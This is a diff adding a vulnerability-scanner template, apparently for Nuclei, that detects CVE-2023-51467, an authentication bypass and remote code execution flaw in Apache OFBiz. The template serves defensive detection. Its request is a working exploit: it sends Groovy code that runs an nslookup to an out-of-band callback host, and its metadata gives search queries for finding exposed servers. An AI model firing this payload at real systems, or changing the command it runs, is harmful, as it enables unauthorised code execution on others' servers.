@@ -1,0 +1,51 @@
+id: CVE-2023-51467
+
+info:
+  name: Apache OFBiz < 18.12.11 - Remote Code Execution
+  author: your3cho
+  severity: critical
+  description: |
+    The vulnerability allows attackers to bypass authentication to achieve a simple Server-Side Request Forgery (SSRF)
+  reference:
+    - https://lists.apache.org/thread/9tmf9qyyhgh6m052rhz7lg9vxn390bdv
+    - https://www.openwall.com/lists/oss-security/2023/12/26/3
+    - https://twitter.com/_0xf4n9x_/status/1740202435367543183
+    - https://nvd.nist.gov/vuln/detail/CVE-2023-51467
+    - https://issues.apache.org/jira/browse/OFBIZ-12873
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cve-id: CVE-2023-51467
+    cwe-id: CWE-918
+    epss-score: 0.68495
+    epss-percentile: 0.97894
+    cpe: cpe:2.3:a:apache:ofbiz:*:*:*:*:*:*:*:*
+  metadata:
+    max-request: 1
+    vendor: apache
+    product: ofbiz
+    shodan-query: html:"OFBiz"
+    fofa-query: app="Apache_OFBiz"
+  tags: cve2023,cve,apache,ofbiz,rce
+
+http:
+  - raw:
+      - |
+        POST /webtools/control/ProgramExport;/?USERNAME=&PASSWORD=&requirePasswordChange=Y HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        groovyProgram=import+groovy.lang.GroovyShell%3B%0A%0AString+expression+%3D+%22'nslookup+{{interactsh-url}}'.execute()%22%3B%0AGroovyShell+gs+%3D+new+GroovyShell()%3B%0Ags.evaluate(expression)%3B
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+      - type: word
+        part: header
+        words:
+          - 'OFBiz.Visitor='
+# digest: 4a0a0047304502203c57270ab59d7bb994c9c151f2d2fd77583f905570eabb408ebd6b13be0cb769022100f9c9673ed3529407d3fc42ccf9af89de53dae6afa4b72b939c0ad1c2c4a1e6bd:922c64590222798bb761d5b6d8e72950
